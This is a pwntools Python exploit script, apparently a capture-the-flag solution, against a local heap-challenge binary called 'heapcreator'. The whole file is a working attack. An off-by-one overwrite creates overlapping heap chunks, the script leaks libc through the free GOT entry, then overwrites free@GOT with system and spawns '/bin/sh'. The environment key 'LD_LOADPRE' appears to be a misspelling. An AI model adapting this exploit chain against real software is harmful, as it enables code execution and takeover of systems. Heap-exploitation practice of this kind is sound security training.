#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

def create(size, content):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendlineafter(":", content)

def edit(idx, content):
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", str(idx))
    io.sendlineafter(" : ", content)

def show(idx):
    io.sendlineafter(" :", "3")
    io.sendlineafter(" :", str(idx))

def delete(idx):
    io.sendlineafter(" :", "4")
    io.sendlineafter(" :", str(idx))

if __name__ == "__main__":
    io = process("./heapcreator", {"LD_LOADPRE": "/lib/x86_64-linux-gnu/libc.so.6"})
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    create(0x18, '0000') # 0
    create(0x10, '1111') # 1

    payload = "/bin/sh\0" + cyclic(0x10) + p8(0x41)
    edit(0, payload) # overwrite 1

    delete(1) # overlapping chunk

    freeGot = 0x0000000000602018
    payload = p64(0) * 4 + p64(0x30) + p64(freeGot)
    create(0x30, payload)
    show(1)

    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - libc.sym["free"]
    success("libcBase -> {:#x}".format(libcBase))
    #  pause()
    edit(1, p64(libcBase + libc.sym["system"]))

    delete(0)
    io.interactive()
    io.close()
